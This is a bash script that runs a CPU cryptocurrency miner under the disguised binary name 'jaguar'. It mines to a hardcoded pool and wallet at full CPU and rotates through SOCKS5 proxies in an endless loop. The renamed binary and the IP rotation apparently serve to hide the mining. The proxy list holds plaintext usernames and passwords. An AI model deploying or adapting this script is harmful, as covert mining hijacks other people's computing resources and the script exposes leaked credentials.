#!/bin/bash

# Define proxy configurations for each session, including username and password for each proxy
proxies=(
  "tstktgya:gumaoo12@104.239.90.211:6602"
  "tstktgya:gumaoo12@64.137.70.79:5630"
  "tstktgya:gumaoo12@64.137.66.241:5826"
  "tstktgya:gumaoo12@93.118.38.222:6366"
  "tstktgya:gumaoo12@94.176.106.84:6498"
  "tstktgya:gumaoo12@45.249.106.169:5866"
  "mastahvan33:lhekfawgr@161.123.130.219:5890"
  "mastahvan33:lhekfawgr@45.41.162.194:6831"
  "mastahvan33:lhekfawgr@172.245.7.98:5151"
  "mastahvan33:lhekfawgr@154.30.241.144:9855"
)

# Function to run ccminer with a specified proxy
run_ccminer() {
  local proxy=$1

  # Extract the proxy details (username, password, IP, and port)
  local username=$(echo "$proxy" | cut -d'@' -f1 | cut -d':' -f1)
  local password=$(echo "$proxy" | cut -d'@' -f1 | cut -d':' -f2)
  local proxy_ip=$(echo "$proxy" | cut -d'@' -f2 | cut -d':' -f1)
  local proxy_port=$(echo "$proxy" | cut -d'@' -f2 | cut -d':' -f2)

  # Kill any leftover ccminer processes from previous runs
  pkill -f 'jaguar'
  sleep 2  # Wait to ensure all processes are terminated

  # Set up graftcp configuration
  cat > /root/graftcp/local/graftcp-local.conf <<END
loglevel = 1
socks5 = $proxy_ip:$proxy_port
socks5_username = $username
socks5_password = $password
END

  # Start graftcp local proxy
  /usr/bin/graftcp-local -config /root/graftcp/local/graftcp-local.conf &
  sleep .2

  # Check public IP using the proxy
  /usr/bin/graftcp curl ifconfig.me
  echo " "
  echo " "

  # Run ccminer in the background
  /usr/bin/graftcp ./jaguar -c stratum+tcp://138.197.29.207:4444 -u RW7q4an3QCeRH89sqrGcHKopjTX1Uj4oFT.$(echo $(shuf -i 100-1000 -n 1)) -p x --cpu "$(nproc)"  &

  # Store the process ID (PID) of ccminer
  ccminer_pid=$!

  # Sleep for xx minutes
  sleep 2600

  # Send SIGINT to ccminer to terminate gracefully (equivalent to Ctrl + C)
  kill -2 $ccminer_pid

  # Wait up to 10 seconds for the process to terminate
  for i in {1..10}; do
    if ! ps -p $ccminer_pid > /dev/null; then
      echo "ccminer process terminated gracefully."
      break
    fi
    sleep 1
  done

  # If the process is still running, force kill it
  if ps -p $ccminer_pid > /dev/null; then
    echo "Force killing jaguar process."
    kill -9 $ccminer_pid
  fi

  # Ensure all ccminer processes are terminated before proceeding
  pkill -f 'jaguar'
  sleep 2  # Wait to ensure all processes are cleared
}

# Function to show progress bar for sleep
show_progress() {
  local duration=$1  # Total sleep duration
  local interval=5   # Update interval (in seconds)
  local elapsed=0    # Track how much time has passed

  while [ $elapsed -lt $duration ]; do
    # Calculate percentage of completion
    percent=$(( (elapsed * 100) / duration ))

    # Draw the progress bar
    bar="["
    for ((i = 0; i < 20; i++)); do
      if [ $(( i * 5 )) -lt $percent ]; then
        bar="${bar}#"
      else
        bar="${bar}-"
      fi
    done
    bar="${bar}] $percent%"

    # Print progress bar and percentage
    echo -ne "\r$bar"

    # Sleep for the defined interval and update elapsed time
    sleep $interval
    elapsed=$(( elapsed + interval ))
  done

  # Print 100% completion at the end of the sleep period
  echo -e "\r[####################] 100%"
}

# Infinite loop to continuously restart the sequence of 5 runs
cycle=1  # Initialize cycle counter
while true; do
  echo "Starting new cycle #$cycle of proxy runs..."

  # Main loop to run ccminer with a randomly selected proxy configuration
  for ((i = 0; i < 5; i++)); do
    # Select a random proxy from the list
    proxy="${proxies[RANDOM % ${#proxies[@]}]}"
    echo "Using proxy: $proxy"
    run_ccminer "$proxy"
  done

  echo "Cycle #$cycle completed. Restarting the sequence..."

  # Clear terminal output before waiting for the next cycle
  show_progress 200  # Show progress during sleep
  clear  # Clear terminal

  # Increment cycle counter
  cycle=$((cycle + 1))
done
